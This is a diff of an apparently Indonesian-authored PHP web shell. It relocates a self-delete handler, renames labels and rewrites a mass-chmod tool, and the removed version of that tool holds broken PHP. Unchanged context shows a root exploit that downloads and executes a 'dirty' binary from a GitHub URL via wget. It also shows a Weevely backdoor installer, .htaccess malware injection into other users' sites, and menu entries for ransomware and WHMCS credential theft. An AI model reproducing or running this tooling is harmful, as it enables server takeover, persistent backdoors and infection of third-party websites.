@@ -733,7 +733,7 @@ ___  ___         ______                 _              _
   echo "<a style='border:1px groove cyan;' href='?dir=$dir&do=base64pict'>Convert Pict To Base64</a>";
   echo "<a style='border:1px groove cyan;' href='?dir=$dir&do=ransomware'>Ransomware</a>";
   echo "<a style='border:1px groove cyan;' href='?dir=$dir&do=masschm'>Chmod Mass</a>";
-  echo "<a style='border:1px groove cyan;' href='?do=r00t'>Simple Root</a>";
+  echo "<a style='border:1px groove cyan;' href='?dir=$dir&do=r00t'>Simple Root</a>";
   echo "<a style='border:1px groove red;' href='?dir=$dir&do=contact'>Contact</a>";
   echo "</div>";
   echo "</ul>";
@@ -743,7 +743,12 @@ ___  ___         ______                 _              _
   if ($_GET['logout'] == 'true') {
     unset($_SESSION[md5($_SERVER['HTTP_HOST']) ]);
     echo "<script>alert('See you again');window.location='?';</script>";
-  } elseif ($_GET['whmcs'] == 'killer') {
+  } elseif ($_GET['do'] == 'kill') {
+  if (@unlink(preg_replace('!(d+)s.*!', '', __FILE__)))
+    die('<script>alert("Shell removed! Thanks for take my shell today");window.location="?"</script>');
+  else
+    echo '<center><font color="red">Unlink Failed!</font></center>';
+} elseif ($_GET['whmcs'] == 'killer') {
     echo '<form method="post">
     <center>
     <br><u>Input WHMCS configuration.php</u><br><textarea cols="60" name="azztssns" rows="10"></textarea><br><br><input name="conf" size="10"
@@ -859,7 +864,7 @@ ___  ___         ______                 _              _
     <h3>Firefart Exploit</h3>
     Login: ( ssh kudax@" . $ip . " ) or ( su kudax )<br><br>
     New Password: <input type='text' name='passwd' value='jembutkuda'>
-    <input type=submit name=kudaroot value='Root!'></form></center>";
+    <input type='submit' name='kudaroot' value='Root!'></form></center>";
     if ($_POST['kudaroot']) {
       exe("wget https://raw.githubusercontent.com/mrxbarakuda/root/master/dirty && chmod +x dirty && ./dirty" . $_POST['passwd']);
     }
@@ -901,7 +906,7 @@ ___  ___         ______                 _              _
     <input type='text' name='weev_name' class='text' value='weevely.php'><br>
     Password (more than 3 characters):<br>
     <input type='text' name='weev_pass' class='text'><br>
-    <input type='submit' name='install_weev' value='Backdoor!'><br>
+    <input type='submit' name='install_weev' value='Submit'><br>
     </font>
     </center>";
   }
@@ -924,7 +929,7 @@ ___  ___         ______                 _              _
     echo "<center><font color='lime'>Weevely installed!<br><br>Usage: weevely [URL of backdoor] [password]</font></center>";
     success("weevely");
   } else {
-    error("Failed to write backdoor to $weevdir");
+    error("Failed write backdoor to $weevdir");
   }
 }
 } elseif ($_GET['do'] == 'malware') {
@@ -948,7 +953,7 @@ if (isset($_POST['redirect'])) if ($myfile = fopen(".htaccess", 'a')) {
   fclose($myfile);
   ob_end_flush();
 }
-else echo "<script>alert('Malware Ga ke kirim Jancookk'); hideAll();</script>";
+else echo "<script>alert('Malware gak ke kirim cok!'); hideAll();</script>";
 }
 if (isset($_POST['infect'])) {
   $coun = 0;
@@ -974,13 +979,13 @@ if (isset($_POST['infect'])) {
     }
     else $coun = 1;
   }
-  if ($coun == 0) echo "<script>alert('Malware Infect In user ... DONE...!!!!'); hideAll();</script>";
-  else echo "<script>alert('Malware Ga ke kirim Jancookk'); hideAll();</script>";
+  if ($coun == 0) echo "<script>alert('Malware infected on user!'); hideAll();</script>";
+  else echo "<script>alert('Malware gak ke kirim cok!'); hideAll();</script>";
 }
 if (!isset($_POST['code'])) {
   if ($file1 = fopen(".htaccess", 'r')) {
   }
-  else echo "<script>alert('Malware Ga ke kirim Jancookk'); hideAll();</script>";
+  else echo "<script>alert('Malware gak ke kirim cok!'); hideAll();</script>";
 } else {
   if ($myfile = fopen(".htaccess", 'a')) {
     fwrite($myfile, $_POST['code']);
@@ -990,161 +995,106 @@ if (!isset($_POST['code'])) {
     fclose($myfile);
     ob_end_flush();
   }
-  else echo "Permission Denied";
+  else echo "<span style='color: red;'>Permission Denied</span>";
 }
-}elseif ($_GET['do'] == 'masschm') {
+} elseif ($_GET['do'] == 'masschm') {
   /*
   Chmod Mass File and Folder
   Code by Mr.xBarakuda
+  v1.2 - Fixed CWD input
   */
-
   $dosPerm = "0";
   $ficPerm = "0";
-  $error_count = 0; // Menggunakan integer untuk menghitung error CHMOD
+  $retval = "0"; // jumlah error CHMOD gan
 
-  // --- INPUT HANDLING & PATH RESOLUTION ---
-  $user_path_input = isset($_POST["chemin"]) ? $_POST["chemin"] : '';
+  // Jika user mengisi chemin (path), gunakan path tersebut.
+  // Jika kosong, gunakan CWD (Current Working Directory) yang didapat dari getcwd()
+  $chemin_input = isset($_POST["chemin"]) ? trim($_POST["chemin"]) : '';
 
-  // Membersihkan karakter ilegal, mengganti .../ dengan /
-  $chem_raw = preg_replace("/[^_A-Za-z0-9-\.%\/]/i", '', $user_path_input);
-  $chem_raw = str_replace('/\.\.\/', '/', $chem_raw); 
+  if (!empty($chemin_input)) {
+    // Sanitasi input user, hapus karakter berbahaya dan traversal (..)
+    $chem = preg_replace("/[^_A-Za-z0-9-\.%\/]/i", '', $chemin_input);
+    $chem = preg_replace("/\.\.\//", '', $chem);
+    $chem = rtrim($chem, '/');
 
-  // Menentukan Jalur Akhir (Inti perbaikan)
-  define('ABSPATH', dirname(__FILE__));
-  $final_chemin = '';
-
-  // Resolusi Path: Jika dimulai dengan slash, anggap absolut. Selain itu, tambahkan ABSPATH.
-  if (strpos($chem_raw, '/') === 0 || strpos($chem_raw, '\\') === 0) {
-    $final_chemin = $chem_raw; // Path absolut: gunakan langsung
+    // Jika path tidak absolute, gabungkan dengan CWD
+    if (strpos($chem, '/') !== 0 && strpos($chem, ':\\') === false) {
+      $chem = getcwd() . '/' . $chem;
+    }
   } else {
-    // Path relatif: tambahkan ABSPATH
-    $final_chemin = ABSPATH . DIRECTORY_SEPARATOR . $chem_raw; 
+    // Jika user tidak mengisi path, gunakan CWD secara default
+    $chem = getcwd();
   }
 
-  // --- PERMIT VALUE HANDLING ---
-
   // perijinan/hak folder
-  $d1 = preg_replace("/[^57]/", '', isset($_POST["dir1"]) ? $_POST["dir1"] : '');
-  $d2 = preg_replace("/[^057]/", '', isset($_POST["dir2"]) ? $_POST["dir2"] : '');
-  $d3 = preg_replace("/[^057]/", '', isset($_POST["dir3"]) ? $_POST["dir3"] : '');
+  $d1 = preg_replace("/[^57]/", '', $_POST["dir1"]);
+  $d2 = preg_replace("/[^057]/", '', $_POST["dir2"]);
+  $d3 = preg_replace("/[^057]/", '', $_POST["dir3"]);
   $dosPerm = "0" . $d1 . $d2 . $d3;
   $dosPerm = octdec($dosPerm);
 
   // perijinan/hak file
-  $f1 = preg_replace("/[^46]/i", '', isset($_POST["fic1"]) ? $_POST["fic1"] : '');
-  $f2 = preg_replace("/[^046]/i", '', isset($_POST["fic2"]) ? $_POST["fic2"] : '');
-  $f3 = preg_replace("/[^046]/i", '', isset($_POST["fic3"]) ? $_POST["fic3"] : '');
+  $f1 = preg_replace("/[^46]/i", '', $_POST["fic1"]);
+  $f2 = preg_replace("/[^046]/i", '', $_POST["fic2"]);
+  $f3 = preg_replace("/[^046]/i", '', $_POST["fic3"]);
   $ficPerm = "0" . $f1 . $f2 . $f3;
   $ficPerm = octdec($ficPerm);
 
-  // --- OUTPUT (Struktur HTML yang Disederhanakan) ---
-  echo "<center><h3 style='color: #333;'>CHMOD Mass File and Folder by Mr.xBarakuda</h3>";
-  echo "<table border='1' style='width: 80%; margin: 20px auto;'>";
-  echo "<tr><td style='padding-right: 20px;'>"; // Kolom pertama untuk form control
+  print "<center><h3>CHMOD Mass File and Folder by Mr.xBarakuda</h3>";
+  print "<table><tr><td>";
+  print "<form method='post'>";
+  print "<tr><td>Hak Folder: </td>";
+  print "<td><select name='dir1'><option value='5'>5</option><option value='7' selected>7</option></select><select name='dir2'><option value='0'>0</option><option value='5' selected>5</option><option value='7'>7</option></select><select name='dir3'><option value='0'>0</option><option value='5' selected>5</option><option value='7'>7</option></select></td></tr>";
+  print "<tr><td>Hak File: </td>";
+  print "<td><select name='fic1'><option value='4'>4</option><option value='6' selected>6</option></select><select name='fic2'><option value='0'>0</option><option value='4' selected>4</option><option value='6'>6</option></select><select name='fic3'><option value='0'>0</option><option value='4' selected>4</option><option value='6'>6</option></select></td></tr>";
+  print "<tr><td>CWD =></td>";
+  print "<td><input type='text' name='chemin' maxlength='200' size='50' value='" . htmlspecialchars(getcwd()) . "'></td></tr>";
+  print "<tr><td> </td><td><input type='submit' value='Change Permissions!'></td></tr>";
+  print "</form></td></tr></table></center>";
 
-    // A. FORM FIELDS (Di sini kita harus membangun seluruh struktur input)
-    $form_html = '<form method="post">';
-
-    // Baris Hak Folder
-    $form_html .= "<tr><td style='padding-right: 10px;'>Hak Folder:</td><td>";
-    $form_html .= "<select name=\"dir1\">";
-    $form_html .= "<option value=\"5\"" . (isset($_POST['dir1']) && $_POST['dir1'] == '5') ? ' selected' : ''; . ">5</option>";
-    $form_html .= "<option value=\"7\"" . (isset($_POST['dir1']) && $_POST['dir1'] == '7') ? ' selected' : ''; . ">7</option></select></td>";
-    $form_html .= "<td style='padding-right: 10px;'>";
-    $form_html .= "<select name=\"dir2\">";
-    $form_html .= "<option value=\"0\"" . (isset($_POST['dir2']) && $_POST['dir2'] == '0') ? ' selected' : ''; . ">0</option>";
-    $form_html .= "<option value=\"5\"" . (isset($_POST['dir2']) && $_POST['dir2'] == '5') ? ' selected' : ''; . ">5</option>";
-    $form_html .= "<option value=\"7\"" . (isset($_POST['dir2']) && $_POST['dir2'] == '7') ? ' selected' : ''; . ">7</option></select></td>";
-    $form_html .= "<td style='padding-right: 10px;'>";
-    $form_html .= "<select name=\"dir3\">";
-    $form_html .= "<option value=\"0\"" . (isset($_POST['dir3']) && $_POST['dir3'] == '0') ? ' selected' : ''; . ">0</option>";
-    $form_html .= "<option value=\"5\"" . (isset($_POST['dir3']) && $_POST['dir3'] == '5') ? ' selected' : ''; . ">5</option>";
-    $form_html .= "<option value=\"7\"" . (isset($_POST['dir3']) && $_POST['dir3'] == '7') ? ' selected' : ''; . ">7</option></select></td>";
-    $form_html .= "</tr>";
-
-    // Baris Hak File
-    $form_html .= "<tr><td style='padding-right: 10px;'>Hak File:</td><td>";
-    $form_html .= "<select name=\"fic1\">";
-    $form_html .= "<option value=\"4\"" . (isset($_POST['fic1']) && $_POST['fic1'] == '4') ? ' selected' : ''; . ">4</option>";
-    $form_html .= "<option value=\"6\"" . (isset($_POST['fic1']) && $_POST['fic1'] == '6') ? ' selected' : ''; . ">6</option></select></td>";
-    $form_html .= "<td style='padding-right: 10px;'>";
-    $form_html .= "<select name=\"fic2\">";
-    $form_html .= "<option value=\"0\"" . (isset($_POST['fic2']) && $_POST['fic2'] == '0') ? ' selected' : ''; . ">0</option>";
-    $form_html .= "<option value=\"4\"" . (isset($_POST['fic2']) && $_POST['fic2'] == '4') ? ' selected' : ''; . ">4</option>";
-    $form_html .= "<option value=\"6\"" . (isset($_POST['fic2']) && $_POST['fic2'] == '6') ? ' selected' : ''; . ">6</option></select></td>";
-    $form_html .= "<td style='padding-right: 10px;'>";
-    $form_html .= "<select name=\"fic3\">";
-    $form_html .= "<option value=\"0\"" . (isset($_POST['fic3']) && $_POST['fic3'] == '0') ? ' selected' : ''; . ">0</option>";
-    $form_html .= "<option value=\"4\"" . (isset($_POST['fic3']) && $_POST['fic3'] == '4') ? ' selected' : ''; . ">4</option>";
-    $form_html .= "<option value=\"6\"" . (isset($_POST['fic3']) && $_POST['fic3'] == '6') ? ' selected' : ''; . ">6</option></select></td>";
-    $form_html .= "</tr>";
-
-    // Baris CWD/Path
-    $display_value = htmlspecialchars($user_path_input); 
-    $form_html .= "<tr><td style='padding-right: 10px;'>CWD =></td><td><input type=\"text\" name=\"chemin\" maxlength=\"30\" size=\"40\" value=\"" . $display_value . "\"></td><td colspan='2'>&nbsp;</td></tr>";
-
-    // Tombol Submit
-    $form_html .= "<tr><td colspan='4'><input type=\"submit\" value=\"Change Permissions!\"></td></tr>";
-
-    $form_html .= '</form>';
-    echo $form_html;
-  echo "</td></tr>"; // Penutup form dan kolom pertama
-
-  // --- PROCESSING LOGIC (Eksekusi CHMOD) ---
   if (($dosPerm || $ficPerm) > 0) {
 
-    function rChmod_executor($chem, $dosPerm, $ficPerm): string {
-        $output = "";
-        $error_count = 0;
+    function rChmod($chem, $dosPerm, $ficPerm) {
+      global $retval;
+      echo "<p><b>Result:</b></p>\r\n";
 
-        if (!is_dir($chem)) {
-            return "ERROR: Directory '$chem' tidak ditemukan atau path invalid.";
+      if (!is_dir($chem)) {
+        echo "<font color=red>[-] ERROR: Directory tidak valid: " . htmlspecialchars($chem) . "</font><br>\r\n";
+        return $retval;
+      }
+
+      $d = new RecursiveDirectoryIterator($chem);
+      $d->setFlags(RecursiveDirectoryIterator::SKIP_DOTS);
+      foreach (new RecursiveIteratorIterator($d, 1) as $path) {
+        $chmodret = false;
+        $chmodresultat = "";
+        if ($path->isDir()) {
+          $chmodret = chmod($path, $dosPerm);
+        } else {
+          if (is_file($path)) {
+            $chmodret = chmod($path, $ficPerm);
+          }
         }
-
-        try {
-            $d = new RecursiveDirectoryIterator($chem);
-            $d->setFlags(RecursiveDirectoryIterator::SKIP_DOTS);
-            foreach (new RecursiveIteratorIterator($d, 1) as $path) {
-                $chmodret = false;
-                $chmodresultat = "";
-
-                if ($path->isDir()) {
-                    $chmodret = @chmod($path, $dosPerm);
-                } else {
-                    if (is_file($path)) {
-                        $chmodret = @chmod($path, $ficPerm);
-                    }
-                }
-
-                if ($chmodret) {
-                    $chmodresultat = "<span style='color:green;'>[+] SUKSES [+]</span>";
-                } else {
-                    $chmodresultat = "<span style='color:red;'>[-] ERROR [-]</span>";
-                    $error_count++;
-                }
-                // Menggunakan \n untuk output konsol/teks, atau 
- jika dalam konteks HTML
-                $output .= $chmodresultat . " " . $path . "\n"; 
-            }
-        } catch (Exception $e) {
-            return "EXCEPTION CAUGHT: " . $e->getMessage();
+        if ($chmodret) {
+          $chmodresultat = "<font color=lime>[+] SUKSES [+]</font>";
+        } else {
+          $chmodresultat = "<font color=red>[-] ERROR [-]</font>";
+          ++$retval;
         }
-
-        return ($error_count > 0) ? "<p style='color:red;'>Total $error_count CHMOD error. Lihat detail di atas.</p>" : "";
+        echo $chmodresultat . " " . htmlspecialchars($path) . "<br>\r\n";
+      }
+      return $retval;
     }
 
-    $execution_result = rChmod_executor($final_chemin, $dosPerm, $ficPerm);
-    echo "<h2>Status Proses</h2>";
-    // Karena fungsi sekarang mengembalikan string pesan error/status
-    echo "<div style='border: 1px solid #ccc; padding: 15px; background-color: #f9f9f9;'>";
-    echo $execution_result;
-    echo "</div>";
-  } else {
-      echo "<p style='color:orange;'>WARNING: Tidak ada perizinan (Permissions) yang diatur.</p>";
+    $nbfailed = rChmod($chem, $dosPerm, $ficPerm);
+    echo "<p><b>";
+    if ($nbfailed > 0) {
+      echo $nbfailed . "<font color=red>CHMOD error, liat kesalahan diatas</font>";
+    }
+    else echo "<font color=lime>DONE gan :v</font>";
+    echo "</b></p>\r\n";
   }
-
-  echo "</table>";
-  echo "</center>";
+  print "</body></html>";
 } elseif ($_GET['do'] == 'base64pict') {
   /*
   ** Convert Gambar ke Base64
@@ -3469,9 +3419,6 @@ echo "</form>";
       fclose($sockfd);
     }
   }
-} elseif ($_GET['do'] == 'kill') {
-  if (@unlink(preg_replace('!(d+)s.*!', '', __FILE__))) die('<script>alert("Shell removed! Thanks for take my shell today");window.location="?"</script>');
-  else echo '<center><font color="red">Unlink Failed!</font></center>';
 } elseif ($_GET['do'] == 'domains') {
   echo "<div class=mybox><center><h3>Domains Viewers</h3>";
   $d0mains = @file("/etc/named.conf");
